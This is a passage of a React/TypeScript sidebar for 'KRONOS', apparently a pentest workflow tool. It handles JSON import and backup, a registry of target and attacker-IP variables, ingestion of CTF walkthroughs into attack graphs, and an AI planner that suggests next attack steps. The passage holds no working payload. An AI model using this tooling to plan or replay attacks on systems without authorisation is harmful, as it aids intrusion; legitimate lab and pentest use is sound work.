              sourceNodeId: cleanSourceId,
              targetNodeId: cleanTargetId,
              type: (conn.type === 'default' || conn.type === 'credential_flow' || conn.type === 'pivoting') ? conn.type : 'default',
              label: conn.label !== undefined ? sanitizeStr(conn.label) : undefined
            });
          }
        });

        // 4. Validate and construct complete Global Vector Variables Map
        const cleanGlobalVars: Record<string, string> = {
          '$TARGET': '10.10.53.217',
          '$ATTACKER_IP': '10.10.14.53',
          '$PORT': '80',
          '$DOMAIN': 'corp.local',
          '$USER': 'admin',
          '$PASSWORD': 'admin'
        };

        const importedGlobals = data.globalVars || {};
        if (typeof importedGlobals === 'object' && importedGlobals !== null) {
          Object.entries(importedGlobals).forEach(([key, value]) => {
            if (typeof key === 'string' && typeof value === 'string') {
              let sanitizedKey = key.trim();
              if (sanitizedKey) {
                if (!sanitizedKey.startsWith('$')) {
                  sanitizedKey = '$' + sanitizedKey;
                }
                cleanGlobalVars[sanitizedKey] = sanitizeStr(value);
              }
            }
          });
        }

        // Backward compatibility fallback if globalVars array wasn't saved but standalone fields exist
        if (typeof data.target === 'string' && data.target) {
          cleanGlobalVars['$TARGET'] = sanitizeStr(data.target);
        }
        if (typeof data.attackerIp === 'string' && data.attackerIp) {
          cleanGlobalVars['$ATTACKER_IP'] = sanitizeStr(data.attackerIp);
        }

        // 5. Apply state changes atomically
        setGlobalVars(cleanGlobalVars);
        onReplaceGraph(validNodes, validConnections);

        // Feedback in standard terminal
        onLogMessage('success', `Import Security Audit Passed: Load validation successful for dashboard state! Re-established ${validNodes.length} workflow action milestones, ${validConnections.length} communication linkages, and ${Object.keys(cleanGlobalVars).length} global vector configs.`);
      } catch (err: any) {
        onLogMessage('error', `Sandbox Import aborted during payload checks: ${err.message}`);
      }
    };
    reader.onerror = () => {
      onLogMessage('error', 'Critical read error encountered during file buffer ingestion.');
    };
    reader.readAsText(file);
    e.target.value = ''; // Clear file element to allow secondary loads
  };

  // Direct manual JSON diagram direct-injection updater with robust parser & error catcher
  const handleUpdateFromJson = () => {
    setJsonError(null);
    try {
      if (!jsonText.trim()) {
        throw new Error('El contenido JSON no puede estar vacío.');
      }
      
      let data: any;
      try {
        data = JSON.parse(jsonText);
      } catch (parseErr: any) {
        throw new Error(`Error sintáctico JSON: ${parseErr.message}`);
      }

      if (!data || typeof data !== 'object') {
        throw new Error('Formato erróneo: El JSON principal debe ser un objeto { "nodes": [], "connections": [] }');
      }

      if (!Array.isArray(data.nodes)) {
        throw new Error('Campo "nodes" faltante o inválido. Debe ser un array.');
      }

      const sanitizeStr = (str: any, defaultVal = ''): string => {
        if (typeof str !== 'string') return defaultVal;
        return str.replace(/<[^>]*>/g, '').trim();
      };

      // Validate nodes
      const validNodes: PentestNode[] = [];
      data.nodes.forEach((node: any, idx: number) => {
        if (!node || typeof node !== 'object') {
          throw new Error(`Nodo inválido en posición ${idx}: Estructura errónea.`);
        }
        if (!node.id) {
          throw new Error(`Nodo en posición ${idx} carece de "id" obligatorio.`);
        }
        if (!node.title) {
          throw new Error(`Nodo con ID "${node.id}" (posición ${idx}) carece de "title" obligatorio.`);
        }

        const cleanId = sanitizeStr(node.id);
        const cleanTitle = sanitizeStr(node.title);
        const cleanDescription = typeof node.description === 'string' ? sanitizeStr(node.description) : '';
        const validTypes: NodeClass[] = ['discovery', 'web', 'custom', 'exploitation', 'post-exploitation', 'ad']; // supported types
        const cleanType = validTypes.includes(node.type) ? node.type : 'custom';
        const cleanTool = typeof node.tool === 'string' ? sanitizeStr(node.tool) : 'Tool';
        const validStates: NodeState[] = ['pending', 'running', 'success', 'failed', 'discarded'];
        const cleanState = validStates.includes(node.state) ? node.state : 'pending';
        const cleanCommandTemplate = typeof node.commandTemplate === 'string' ? node.commandTemplate : '';
        
        const cleanParams: Record<string, string> = {};
        if (node.customParams && typeof node.customParams === 'object') {
          Object.entries(node.customParams).forEach(([k, v]) => {
            if (typeof k === 'string' && typeof v === 'string') {
              cleanParams[sanitizeStr(k)] = sanitizeStr(v);
            }
          });
        }

        const cleanEvidence: any = {};
        if (node.evidenceProduced && typeof node.evidenceProduced === 'object') {
          const ev = node.evidenceProduced;
          if (Array.isArray(ev.open_ports)) {
            cleanEvidence.open_ports = ev.open_ports.map((p: any) => Number(p)).filter((p: any) => !isNaN(p));
          }
          if (Array.isArray(ev.services)) {
            cleanEvidence.services = ev.services.map((s: any) => sanitizeStr(s)).filter(Boolean);
          }
          if (typeof ev.findings === 'string') {
            cleanEvidence.findings = sanitizeStr(ev.findings);
          }
          if (Array.isArray(ev.credentials)) {
            cleanEvidence.credentials = ev.credentials
              .filter((c: any) => c && typeof c === 'object')
              .map((c: any) => ({
                username: sanitizeStr(c.username, 'admin'),
                password: c.password !== undefined ? sanitizeStr(c.password) : undefined,
                hash: c.hash !== undefined ? sanitizeStr(c.hash) : undefined,
                service: c.service !== undefined ? sanitizeStr(c.service) : undefined
              }));
          }
          if (Array.isArray(ev.extracted_urls)) {
            cleanEvidence.extracted_urls = ev.extracted_urls.map((u: any) => sanitizeStr(u)).filter(Boolean);
          }
          if (typeof ev.notes === 'string') {
            cleanEvidence.notes = sanitizeStr(ev.notes);
          }
          if (typeof ev.raw_output === 'string') {
            cleanEvidence.raw_output = sanitizeStr(ev.raw_output);
          }
        }

        const cleanPosition = {
          x: typeof node.position?.x === 'number' ? Math.max(-10000, Math.min(10000, node.position.x)) : 100,
          y: typeof node.position?.y === 'number' ? Math.max(-10000, Math.min(10000, node.position.y)) : 100
        };

        const cleanTags = Array.isArray(node.tags)
          ? node.tags.map((t: any) => sanitizeStr(t)).filter(Boolean)
          : [cleanTool.toLowerCase()];

        validNodes.push({
          id: cleanId,
          title: cleanTitle,
          description: cleanDescription,
          type: cleanType,
          tool: cleanTool,
          state: cleanState,
          commandTemplate: cleanCommandTemplate,
          customParams: cleanParams,
          evidenceProduced: cleanEvidence,
          position: cleanPosition,
          tags: cleanTags,
          isSuggested: !!node.isSuggested,
          suggestedReason: node.suggestedReason ? sanitizeStr(node.suggestedReason) : undefined,
          updatedAt: typeof node.updatedAt === 'string' ? sanitizeStr(node.updatedAt) : new Date().toISOString()
        });
      });

      // Validate Connections
      const validConnections: NodeConnection[] = [];
      if (data.connections) {
        if (!Array.isArray(data.connections)) {
          throw new Error('El campo opcional "connections" debe ser un array.');
        }
        data.connections.forEach((conn: any, idx: number) => {
          if (!conn || typeof conn !== 'object') return;
          const cleanId = typeof conn.id === 'string' ? sanitizeStr(conn.id) : `conn-${Date.now()}-${idx}`;
          const cleanSourceId = typeof conn.sourceNodeId === 'string' ? sanitizeStr(conn.sourceNodeId) : '';
          const cleanTargetId = typeof conn.targetNodeId === 'string' ? sanitizeStr(conn.targetNodeId) : '';
          
          if (cleanSourceId && cleanTargetId) {
            validConnections.push({
              id: cleanId,
              sourceNodeId: cleanSourceId,
              targetNodeId: cleanTargetId,
              type: (conn.type === 'default' || conn.type === 'credential_flow' || conn.type === 'pivoting') ? conn.type : 'default',
              label: conn.label !== undefined ? sanitizeStr(conn.label) : undefined
            });
          }
        });
      }

      // Synchronize Global Variables Map if supplied
      if (data.globalVars && typeof data.globalVars === 'object') {
        const cleanGlobalVars: Record<string, string> = { ...globalVars };
        Object.entries(data.globalVars).forEach(([key, value]) => {
          if (typeof key === 'string' && typeof value === 'string') {
            let sanitizedKey = key.trim();
            if (sanitizedKey) {
              if (!sanitizedKey.startsWith('$')) {
                sanitizedKey = '$' + sanitizedKey;
              }
              cleanGlobalVars[sanitizedKey] = sanitizeStr(value);
            }
          }
        });
        setGlobalVars(cleanGlobalVars);
        if (cleanGlobalVars['$TARGET']) onChangeTarget(cleanGlobalVars['$TARGET']);
        if (cleanGlobalVars['$ATTACKER_IP']) onChangeAttackerIp(cleanGlobalVars['$ATTACKER_IP']);
      }

      onReplaceGraph(validNodes, validConnections, 'Manual JSON Edit');
      onLogMessage('success', `Diagrama actualizado desde JSON: Creados ${validNodes.length} nodos y ${validConnections.length} relaciones.`);
    } catch (err: any) {
      setJsonError(err.message);
      onLogMessage('error', `Error al validar JSON: ${err.message}`);
    }
  };

  // Autodetect attacker IP helper simulation
  const simulateAutodetectIP = () => {
    const simulatedVpnIPs = ['10.10.14.8', '10.10.16.5', '192.168.49.53', '10.11.1.22'];
    const selectedIp = simulatedVpnIPs[Math.floor(Math.random() * simulatedVpnIPs.length)];
    onChangeAttackerIp(selectedIp);
    onLogMessage('success', `Autodetected attack pipeline VPN IP adapter (tun0): ${selectedIp}`);
  };

  // Call server-side API to use Gemini smart suggestions
  const triggerSmartSuggestions = async () => {
    setSuggestLoading(true);
    setAiSuggestions([]);
    
    // Build brief target summary
    const evidenceSummary = `Target is host ${target}. Detected open ports across nodes: [${allPorts.join(', ')}]. Services active: [${allServices.join(', ')}]. Findings: ${nodes.map(n => n.evidenceProduced.findings).filter(Boolean).slice(0, 3).join('; ')}`;
    
    try {
      const response = await fetch('/api/ai/suggest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          currentNodes: nodes.map(n => ({ tool: n.tool, type: n.type })),
          target: target,
          evidenceSummary: evidenceSummary
        })
      });
      const data = await response.json();
      if (data.suggestions) {
        setAiSuggestions(data.suggestions);
        onLogMessage('ai', `AI suggestion motor returned ${data.suggestions.length} high-probability next hops.`);
      }
    } catch (err: any) {
      onLogMessage('error', `Failed triggers smart AI suggestion: ${err.message}`);
    } finally {
      setSuggestLoading(false);
    }
  };

  const spawnSmartSuggestion = (item: any) => {
    const newNode: PentestNode = {
      id: `node-${Date.now()}`,
      title: item.title,
      description: item.description,
      type: item.type,
      tool: item.tool,
      state: 'pending',
      commandTemplate: item.commandTemplate,
      customParams: {},
      evidenceProduced: {},
      position: { x: Math.round(300 + Math.random() * 100), y: Math.round(180 + Math.random() * 100) },
      tags: item.tags,
      isSuggested: true,
      suggestedReason: item.reason,
      updatedAt: new Date().toISOString()
    };

    onAddNode(newNode);
    onLogMessage('ai', `Spawned smart suggested node targeting next actions: ${item.tool}`);
    // Clear recommendation after spawner so UI remains clean
    setAiSuggestions(prev => prev.filter(s => s.tool !== item.tool));
  };

  return (
    <div className="w-80 bg-[#0A0B0E] border-r border-white/10 flex flex-col h-full text-slate-300 shrink-0 select-none">
      
      {/* App Logo & Header */}
      <div className="p-4 border-b border-white/10 bg-[#0F1116] flex items-center space-x-2 shrink-0">
        <Server className="h-5 w-5 text-emerald-400 animate-pulse" />
        <div>
          <h1 className="text-sm font-bold tracking-wider text-slate-100 uppercase font-sans">KRONOS OPERATING DECK</h1>
          <p className="text-[9px] text-[#10B981] font-mono font-semibold">REPLAY & COGNITIVE ENGINE</p>
        </div>
      </div>

      {/* Main Tab Switcher bar */}
      <div className="grid grid-cols-5 border-b border-white/10 bg-[#0A0B0E] p-1 shrink-0">
        <button
          id="sidebar-tab-variables"
          onClick={() => setActiveSidebarTab('variables')}
          className={`py-2 text-[9px] font-mono uppercase rounded transition cursor-pointer text-center flex flex-col items-center justify-center gap-1 ${
            activeSidebarTab === 'variables' ? 'bg-emerald-600/10 text-emerald-300 font-bold border border-emerald-500/20' : 'text-slate-500 hover:text-slate-300'
          }`}
          title="Global variables registry"
        >
          <Settings className="h-3.5 w-3.5" />
          <span>VARS</span>
        </button>
        <button
          id="sidebar-tab-ingestion"
          onClick={() => setActiveSidebarTab('ingestion')}
          className={`py-2 text-[9px] font-mono uppercase rounded transition cursor-pointer text-center flex flex-col items-center justify-center gap-1 ${
            activeSidebarTab === 'ingestion' ? 'bg-purple-600/10 text-purple-300 font-bold border border-purple-500/20' : 'text-slate-500 hover:text-slate-300'
          }`}
          title="Walkthrough ingestion pipeline"
        >
          <Sparkles className="h-3.5 w-3.5" />
          <span>INGEST</span>
        </button>
        <button
          id="sidebar-tab-procedures"
          onClick={() => setActiveSidebarTab('procedures')}
          className={`py-2 text-[9px] font-mono uppercase rounded transition cursor-pointer text-center flex flex-col items-center justify-center gap-1 ${
            activeSidebarTab === 'procedures' ? 'bg-[#3b82f6]/10 text-blue-300 font-bold border border-blue-500/20' : 'text-slate-500 hover:text-slate-300'
          }`}
          title="Procedure blocks builder"
        >
          <Plus className="h-3.5 w-3.5" />
          <span>BLOCKS</span>
        </button>
        <button
          id="sidebar-tab-findings"
          onClick={() => setActiveSidebarTab('findings')}
          className={`py-2 text-[9px] font-mono uppercase rounded transition cursor-pointer text-center flex flex-col items-center justify-center gap-1 ${
            activeSidebarTab === 'findings' ? 'bg-[#f59e0b]/10 text-amber-300 font-bold border border-amber-500/20' : 'text-slate-500 hover:text-slate-300'
          }`}
          title="Discovered active findings"
        >
          <ClipboardList className="h-3.5 w-3.5" />
          <span>CABINET</span>
        </button>
        <button
          id="sidebar-tab-json"
          onClick={() => setActiveSidebarTab('json')}
          className={`py-2 text-[9px] font-mono uppercase rounded transition cursor-pointer text-center flex flex-col items-center justify-center gap-1 ${
            activeSidebarTab === 'json' ? 'bg-purple-600/15 text-purple-300 font-bold border border-purple-500/20' : 'text-slate-500 hover:text-slate-300'
          }`}
          title="Direct RAW JSON workflow diagram editor"
        >
          <FileJson className="h-3.5 w-3.5" />
          <span>JSON</span>
        </button>
      </div>

      {/* Main Tab Content - scrollable */}
      <div className="flex-1 overflow-y-auto min-h-0">

        {/* ======================= VARIABLES TAB ======================= */}
        {activeSidebarTab === 'variables' && (
          <div className="p-4 space-y-4">
            <div className="space-y-1">
              <h3 className="text-xs font-mono text-emerald-400 uppercase tracking-wider font-bold">Global Variable Registry</h3>
              <p className="text-[10px] text-slate-400 font-sans leading-relaxed">
                Replicate attacks dynamically by changing values here. Connected nodes auto-interpolate values into command templates ready to replicate.
              </p>
            </div>

            {/* Core variables */}
            <div className="space-y-3 bg-white/[0.01] p-3 rounded border border-white/5">
              <div className="flex flex-col space-y-1">
                <div className="flex justify-between items-center text-[9px] font-mono">
                  <span className="text-emerald-400 font-bold">$TARGET</span>
                  <span className="text-slate-500">Victim IP/Domain</span>
                </div>
                <div className="flex gap-1.5">
                  <input
                    type="text"
                    value={globalVars['$TARGET'] || ''}
                    onChange={(e) => {
                      onChangeTarget(e.target.value);
                      setGlobalVars(prev => ({ ...prev, '$TARGET': e.target.value }));
                    }}
                    placeholder="e.g. 10.10.53.217"
                    className="bg-white/5 border border-white/10 rounded px-2.5 py-1.5 text-xs text-white placeholder:text-slate-650 font-mono flex-1 focus:outline-none focus:border-emerald-500/50"
                  />
                </div>
              </div>

              <div className="flex flex-col space-y-1">
                <div className="flex justify-between items-center text-[9px] font-mono">
                  <span className="text-orange-400 font-bold">$ATTACKER_IP</span>
                  <span className="text-slate-500">Reverse VPN callback</span>
                </div>
                <div className="flex gap-1.5">
                  <input
                    type="text"
                    value={globalVars['$ATTACKER_IP'] || ''}
                    onChange={(e) => {
                      onChangeAttackerIp(e.target.value);
                      setGlobalVars(prev => ({ ...prev, '$ATTACKER_IP': e.target.value }));
                    }}
                    placeholder="e.g. 10.10.14.53"
                    className="bg-white/5 border border-white/10 rounded px-2.5 py-1.5 text-xs text-white placeholder:text-slate-650 font-mono flex-1 focus:outline-none focus:border-orange-500/50"
                  />
                  <button
                    onClick={simulateAutodetectIP}
                    className="text-[9px] font-mono py-1 px-2 rounded bg-orange-600/10 hover:bg-orange-600/20 text-orange-400 border border-orange-500/30 transition cursor-pointer font-bold"
                    title="Simulate tune adapter IP auto-detect"
                  >
                    tun0
                  </button>
                </div>
              </div>
            </div>

            {/* Extended Variable Registry */}
            <div className="space-y-2">
              <span className="text-[10px] font-mono text-slate-400 uppercase tracking-wide block font-bold">Extended Global Registry</span>
              
              {Object.entries(globalVars)
                .filter(([key]) => key !== '$TARGET' && key !== '$ATTACKER_IP')
                .length === 0 ? (
                <div className="p-3 bg-zinc-950/40 rounded border border-zinc-900/55 text-center text-slate-500 font-sans text-xs italic">
                  No custom global variables registered yet. Paste a walkthrough to extract them or add manually below.
                </div>
              ) : (
                <div className="space-y-1.5 max-h-56 overflow-y-auto pr-1">
                  {Object.entries(globalVars)
                    .filter(([key]) => key !== '$TARGET' && key !== '$ATTACKER_IP')
                    .map(([key, val]) => (
                      <div key={key} className="flex items-center gap-1.5 bg-[#0F1116] border border-white/5 p-1 rounded">
                        <span className="text-[9px] font-mono text-zinc-400 w-24 truncate pl-1" title={key}>{key}</span>
                        <input
                          type="text"
                          value={val}
                          onChange={(e) => setGlobalVars(p => ({ ...p, [key]: e.target.value }))}
                          className="bg-black/35 border border-white/10 rounded px-1.5 py-1 text-[10px] text-slate-100 font-mono flex-1 focus:outline-none focus:border-emerald-500/40"
                        />
                        <button
                          onClick={() => {
                            const updated = { ...globalVars };
                            delete updated[key];
                            setGlobalVars(updated);
                            onLogMessage('error', `Removed global variable constraint: ${key}`);
                          }}
                          className="text-rose-500 hover:text-rose-400 p-1 cursor-pointer text-sm leading-none font-bold"
                          title="Wipe variable"
                        >
                          ×
                        </button>
                      </div>
                    ))
                  }
                </div>
              )}

              {/* Variable Registry Builder */}
              <div className="pt-3 border-t border-white/5 space-y-2">
                <span className="text-[9px] font-mono text-slate-500 uppercase tracking-widest block font-bold">Add Custom Parameter</span>
                <div className="flex gap-1 items-center">
                  <input
                    type="text"
                    id="new-sidebar-var-key"
                    placeholder="$LPORT"
                    className="bg-white/5 border border-white/10 rounded px-2 py-1.5 text-xs text-white placeholder:text-slate-650 font-mono w-1/2 focus:outline-none focus:border-white/20"
                    onKeyDown={(e) => {
                      if (e.key === 'Enter') {
                        const keyInp = document.getElementById('new-sidebar-var-key') as HTMLInputElement;
                        const valInp = document.getElementById('new-sidebar-var-val') as HTMLInputElement;
                        let k = keyInp?.value.trim() || '';
                        const v = valInp?.value.trim() || '';
                        if (!k) return;
                        if (!k.startsWith('$')) k = '$' + k;
                        
                        setGlobalVars(p => ({ ...p, [k]: v }));
                        onLogMessage('success', `Added custom global variable: ${k}`);
                        if (keyInp) keyInp.value = '';
                        if (valInp) valInp.value = '';
                      }
                    }}
                  />
                  <input
                    type="text"
                    id="new-sidebar-var-val"
                    placeholder="4444"
                    className="bg-white/5 border border-white/10 rounded px-2 py-1.5 text-xs text-white placeholder:text-slate-650 font-mono w-1/3 focus:outline-none focus:border-white/20"
                    onKeyDown={(e) => {
                      if (e.key === 'Enter') {
                        const keyInp = document.getElementById('new-sidebar-var-key') as HTMLInputElement;
                        const valInp = document.getElementById('new-sidebar-var-val') as HTMLInputElement;
                        let k = keyInp?.value.trim() || '';
                        const v = valInp?.value.trim() || '';
                        if (!k) return;
                        if (!k.startsWith('$')) k = '$' + k;
                        
                        setGlobalVars(p => ({ ...p, [k]: v }));
                        onLogMessage('success', `Added custom global variable: ${k}`);
                        if (keyInp) keyInp.value = '';
                        if (valInp) valInp.value = '';
                      }
                    }}
                  />
                  <button
                    onClick={() => {
                      const keyInp = document.getElementById('new-sidebar-var-key') as HTMLInputElement;
                      const valInp = document.getElementById('new-sidebar-var-val') as HTMLInputElement;
                      let k = keyInp?.value.trim() || '';
                      const v = valInp?.value.trim() || '';
                      if (!k) return;
                      if (!k.startsWith('$')) k = '$' + k;
                      
                      setGlobalVars(p => ({ ...p, [k]: v }));
                      onLogMessage('success', `Added custom global variable: ${k}`);
                      if (keyInp) keyInp.value = '';
                      if (valInp) valInp.value = '';
                    }}
                    className="px-3 py-1.5 bg-emerald-600/10 text-emerald-400 border border-emerald-500/30 font-bold font-mono text-xs rounded hover:bg-emerald-500/20 transition cursor-pointer"
                  >
                    +
                  </button>
                </div>
              </div>
            </div>

            {/* System DB Migration and Backup section */}
            <div className="pt-4 border-t border-white/10 mt-6 space-y-3">
              <div className="flex items-center space-x-1.5 text-xs font-mono font-bold text-amber-400 uppercase tracking-wider">
                <Database className="h-3.5 w-3.5" />
                <span>Migración y Copia de Seguridad</span>
              </div>
              <p className="text-[10px] text-slate-400 font-sans leading-relaxed">
                Exporta o importa la base de datos completa de Kronos (incluyendo todos tus laboratorios guardados del Repertorio y la pizarra de diagramación activa) para respaldar o migrar entre computadores.
              </p>
              
              <div className="grid grid-cols-2 gap-2">
                <button
                  onClick={() => {
                    try {
                      const savedRep = localStorage.getItem('kronos_saved_repertoire_db');
                      let savedRepList = [];
                      if (savedRep) {
                        try { savedRepList = JSON.parse(savedRep); } catch(e){}
                      }
                      
                      const fullBackup = {
                        backupIdentifier: "KRONOS_FULL_SYSTEM_BACKUP",
                        version: 1,
                        exportedAt: new Date().toISOString(),
                        activeState: {
                          globalVars: globalVars,
                          nodes: nodes,
                          connections: connections
                        },
                        savedRepertoire: savedRepList
                      };
                      
                      const blob = new Blob([JSON.stringify(fullBackup, null, 2)], { type: 'application/json' });
                      const url = URL.createObjectURL(blob);
                      const link = document.createElement('a');
                      link.href = url;
                      link.download = `kronos_db_migration_${Date.now()}.json`;
                      link.click();
                      URL.revokeObjectURL(url);
                      onLogMessage('success', '✅ Base de datos completa exportada para migración desde el panel lateral.');
                    } catch(err: any) {
                      onLogMessage('error', `Error exportando backup completo: ${err.message}`);
                    }
                  }}
                  className="py-1.5 px-2 bg-emerald-600/10 hover:bg-emerald-600/20 border border-emerald-500/20 rounded text-[10px] font-mono font-bold text-emerald-400 transition cursor-pointer flex items-center justify-center space-x-1"
                  title="Descargar respaldo completo del sistema (.json)"
                >
                  <Download className="h-3 w-3" />
                  <span>Copia Completa</span>
                </button>
                
                <label
                  className="py-1.5 px-2 bg-purple-600/10 hover:bg-purple-600/20 border border-purple-500/20 rounded text-[10px] font-mono font-bold text-purple-400 transition cursor-pointer flex items-center justify-center space-x-1 text-center"
                  title="Restaurar base de datos y esquemas desde archivo de migración (.json)"
                >
                  <Upload className="h-3 w-3" />
                  <span>Cargar Copia</span>
                  <input
                    type="file"
                    accept=".json"
                    className="hidden"
                    onChange={handleImportJson}
                  />
                </label>
              </div>
            </div>

          </div>
        )}

        {/* ======================= INGESTION TAB ======================= */}
        {activeSidebarTab === 'ingestion' && (
          <div className="p-4 space-y-4">
            <div className="space-y-1">
              <h3 className="text-xs font-mono text-purple-400 uppercase tracking-wider font-bold flex items-center gap-1">
                <Sparkles className="h-3.5 w-3.5 animate-pulse" /> Walkthrough Ingestion Pipeline
              </h3>
              <p className="text-[10px] text-slate-400 font-sans leading-relaxed">
                Paste complete writeups (HTML, Markdown, Raw terminal commands) from HackTheBox, VulnHUub, TryHackMe, or real pentests. AI cognitively analyzes your writeup, extracts hardcoded values, replaces them with variables, and builds connected nodes dynamically!
              </p>
            </div>

            {/* Quick Presets Dropdown */}
            <div className="space-y-1">
              <label className="text-[9.5px] font-mono text-slate-500 uppercase tracking-wider block font-bold">Playground Preset Demos</label>
              <select
                id="walkthrough-preset-selector"
                onChange={(e) => {
                  const idx = parseInt(e.target.value, 10);
                  if (!isNaN(idx) && WALKTHROUGH_PRESETS[idx]) {
                    setWalkthroughText(WALKTHROUGH_PRESETS[idx].text);
                    onLogMessage('info', `Loaded preset writeup demo: "${WALKTHROUGH_PRESETS[idx].name}". Click "Analyze & Build CTF Replayer" below!`);
                  }
                }}
                className="w-full bg-[#0F1116] border border-white/10 rounded px-2.5 py-1.5 text-xs text-purple-300 font-mono focus:outline-none focus:border-purple-500/50"
              >
                <option value="">▼ Pick a demo writeup to ingest...</option>
                {WALKTHROUGH_PRESETS.map((p, idx) => (
                  <option key={idx} value={idx}>{p.name}</option>
                ))}
              </select>
            </div>

            {/* Writeup paste field */}
            <div className="space-y-1.5">
              <div className="flex justify-between items-center text-[9.5px] font-mono">
                <span className="text-purple-400 font-bold uppercase">Raw Writeup Editor</span>
                <button
                  onClick={() => setWalkthroughText('')}
                  className="text-slate-500 hover:text-slate-300 transition text-[8.5px] uppercase cursor-pointer"
                >
                  Clear Area
                </button>
              </div>
              <textarea
                value={walkthroughText}
                onChange={(e) => setWalkthroughText(e.target.value)}
                placeholder="Paste Markdown, blog screenshots dump, or bash command streams here..."
                className="w-full h-80 bg-slate-950 text-slate-300 border border-[#2e263c] focus:border-purple-500 focus:outline-none p-3 rounded font-mono text-[10px] resize-none leading-relaxed"
              />
            </div>

            {/* Trigger parse execution */}
            <button
              id="btn-analyze-walkthrough"
              onClick={handleParseWalkthrough}
              disabled={parseLoading || !walkthroughText.trim()}
              className="w-full py-3 bg-purple-700/20 hover:bg-purple-700/30 text-purple-300 border border-purple-500/50 text-xs font-mono font-bold rounded transition-all disabled:opacity-50 cursor-pointer flex items-center justify-center space-x-2"
            >
              <Cpu className="h-4 w-4 text-purple-400" />
              <span>{parseLoading ? 'Ingesting & Normalizing with AI...' : 'Analyze & Build Attack Canvas'}</span>
            </button>
          </div>
        )}

        {/* ======================= PROCEDURES TAB ======================= */}
        {activeSidebarTab === 'procedures' && (
          <div className="p-4 space-y-4">
            
            {/* Manual Spawn custom action */}
            <div className="space-y-3 bg-[#0c0d12] p-3 rounded border border-white/5">
              <span className="text-[10px] font-mono text-blue-400 uppercase tracking-widest block font-bold">Add Custom Procedure Block</span>
              
              {/* Category switcher */}
              <div className="grid grid-cols-3 gap-0.5 bg-black/40 p-0.5 rounded border border-white/10">
                {(['discovery', 'web', 'ad', 'exploitation', 'post-exploitation', 'custom'] as NodeClass[]).map((cat) => (
                  <button
                    key={cat}
                    onClick={() => handleCategoryChange(cat)}
                    className={`py-1 text-[8px] font-mono uppercase rounded transition cursor-pointer truncate ${
                      selectedCategory === cat ? 'bg-blue-600/25 text-blue-400 border border-blue-500/30 font-bold' : 'text-slate-500 hover:text-slate-300'
                    }`}
                  >
                    {cat === 'post-exploitation' ? 'Post' : cat}
                  </button>
                ))}
              </div>

              {/* Preset selectors catalog */}
              <div className="flex flex-col space-y-1">
                <label className="text-[9px] font-mono text-slate-500">Pick Preset Template</label>
                <select
                  value={selectedPresetIndex}
                  onChange={(e) => {
                    const idx = parseInt(e.target.value, 10);
                    handleCategoryPresetChange(idx);
                  }}
                  className="w-full bg-white/5 border border-white/10 rounded px-2.5 py-1.5 text-xs text-slate-300 font-mono focus:outline-none focus:border-blue-500/50"
                >
                  {categoryPresets[selectedCategory]?.map((p, idx) => (
                    <option key={idx} value={idx}>{p.tool}</option>
                  )) || <option value="">No Presets</option>}
                </select>
              </div>

              {/* Tool Label */}
              <div className="flex flex-col space-y-1">
                <label className="text-[9px] font-mono text-slate-500 font-medium">Tool Name</label>
                <input
                  type="text"
                  value={toolText}
                  onChange={(e) => setToolText(e.target.value)}
                  className="bg-white/5 border border-white/10 rounded px-2.5 py-1.5 text-xs text-white font-mono focus:outline-none focus:border-blue-500/50"
                />
              </div>

              {/* Command Template */}
              <div className="flex flex-col space-y-1">
                <label className="text-[9px] font-mono text-slate-500 font-medium">Command Template</label>
                <textarea
                  value={commandTemplate}
                  onChange={(e) => setCommandTemplate(e.target.value)}
                  className="bg-white/5 border border-white/10 rounded px-2.5 py-2 text-[10px] text-pink-400 font-mono min-h-12 w-full focus:outline-none focus:border-blue-500/50 resize-y"
                />
              </div>

              {/* Add Custom Trigger code block */}
              <button
                id="btn-sidebar-add-custom-node"
                onClick={handleAddCustomNode}
                className="w-full py-2 bg-blue-600/10 hover:bg-blue-600/20 text-blue-400 border border-blue-500/30 text-xs font-mono font-bold rounded flex items-center justify-center space-x-1.5 transition cursor-pointer"
              >
                <Plus className="h-4 w-4" />
                <span>Spawn on Board</span>
              </button>
            </div>

            {/* AI Smart Planner Suggestions */}
            <div className="p-3 bg-emerald-950/5 border border-emerald-500/10 space-y-3 rounded">
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-mono text-emerald-400 uppercase tracking-widest font-semibold flex items-center gap-1.5">
                  <Cpu className="h-3.5 w-3.5 animate-pulse" /> Active AI Planner
                </span>
              </div>
              <p className="text-[9px] text-slate-400 font-sans leading-relaxed">
                Infers the next logical attack vectors dynamically based on current evidence.
              </p>

              <button
                id="btn-sidebar-planner"
                onClick={triggerSmartSuggestions}
                disabled={suggestLoading}
                className="w-full py-2 bg-emerald-600/10 hover:bg-emerald-600/20 border border-emerald-500/30 text-xs font-mono font-bold text-emerald-400 rounded transition duration-200 disabled:opacity-50 cursor-pointer flex items-center justify-center space-x-1.5"
              >
                <Cpu className="h-3.5 w-3.5" />
                <span>{suggestLoading ? 'Thinking...' : 'Compute Next Actions'}</span>
              </button>

              {aiSuggestions.length > 0 && (
                <div className="space-y-2 mt-2 pt-2 border-t border-white/10 max-h-48 overflow-y-auto">
                  {aiSuggestions.map((item, idx) => (
                    <div key={idx} className="bg-[#0F1116] border border-white/10 rounded p-2.5 space-y-2 text-left">
                      <div className="flex items-center justify-between">
                        <span className="text-[10px] text-slate-200 font-bold font-mono">{item.tool}</span>
                        <span className="text-[8px] font-mono border border-emerald-500/30 text-emerald-400 py-0.5 px-1.5 rounded uppercase">{item.type}</span>
                      </div>
                      <p className="text-[9px] text-slate-400 font-sans leading-relaxed">{item.description}</p>
                      <div className="text-[8px] italic text-emerald-400/80 font-mono">Reason: {item.reason}</div>
                      <button
                        onClick={() => spawnSmartSuggestion(item)}
                        className="w-full py-1 bg-emerald-950/20 text-[9px] font-mono text-emerald-400 border border-emerald-500/30 hover:bg-emerald-950/50 rounded block text-center transition cursor-pointer"
                      >
                        + Deploy Node
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* Base Plan structure */}
            <div className="p-3 bg-purple-950/5 border border-purple-500/10 rounded space-y-3">
              <span className="text-[10px] font-mono text-purple-400 uppercase tracking-widest font-bold block">Base Plans Ingest (Json)</span>
              <div className="grid grid-cols-2 gap-2">
                <button
                  onClick={handleLoadSampleBasePlan}
                  className="py-1.5 px-2 bg-purple-950/20 hover:bg-purple-950/40 text-purple-300 border border-purple-500/30 text-[10px] font-mono rounded flex items-center justify-center space-x-1.5 transition cursor-pointer"
                >
                  <Play className="h-3 w-3" />
                  <span>Demo Plan</span>
                </button>
